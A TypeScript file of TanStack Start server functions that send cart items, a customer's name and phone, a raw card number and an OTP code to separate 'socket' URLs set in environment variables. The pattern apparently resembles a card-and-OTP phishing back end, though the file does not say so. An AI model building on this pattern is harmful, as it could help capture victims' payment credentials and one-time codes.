import { env } from '#/env'
import {
  addCardSchema,
  addInfoSchema,
  addToSchema,
  checkoutSchema,
  sendOTPSchema,
} from '#/schema/sokect-schema'
import { createServerFn } from '@tanstack/react-start'

export const addToCartSocket = createServerFn({
  method: 'POST',
})
  .inputValidator(addToSchema)
  .handler(async ({ data }) => {
    const { productId, productName } = data

    const url = `${env.VITE_SOCKET_ADD_TO_CART_URL}`

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ productId, productName }),
    })

    if (!response.ok) {
      throw new Error('Failed to add product to cart')
    }

    const result = await response.json()

    return result
  })

export const addInfoSocket = createServerFn({
  method: 'POST',
})
  .inputValidator(addInfoSchema)
  .handler(async ({ data }) => {
    const { name, phone } = data

    const url = `${env.VITE_SOCKET_ADD_INFO_URL}`

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name, phone }),
    })
    if (!response.ok) {
      throw new Error('Failed to add user info')
    }

    const result = await response.json()

    return result
  })

export const checkoutSocket = createServerFn({
  method: 'POST',
})
  .inputValidator(checkoutSchema)
  .handler(async ({ data }) => {
    const { name } = data

    const url = `${env.VITE_SOCKET_CHECKOUT_URL}`

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name }),
    })
    if (!response.ok) {
      throw new Error('Failed to checkout')
    }

    const result = await response.json()

    return result
  })

export const addCardSocket = createServerFn({
  method: 'POST',
})
  .inputValidator(addCardSchema)
  .handler(async ({ data }) => {
    const { name, cardNumber } = data

    const url = `${env.VITE_SOCKET_ADD_CARD_URL}`

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name, cardNumber }),
    })
    if (!response.ok) {
      throw new Error('Failed to add card info')
    }

    const result = await response.json()

    return result
  })

export const sendOTPSocket = createServerFn({
  method: 'POST',
})
  .inputValidator(sendOTPSchema)
  .handler(async ({ data }) => {
    const { name, otp } = data

    const url = `${env.VITE_SOCKET_SEND_OTP_URL}`

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name, otp }),
    })
    if (!response.ok) {
      throw new Error('Failed to send OTP')
    }

    const result = await response.json()

    return result
  })
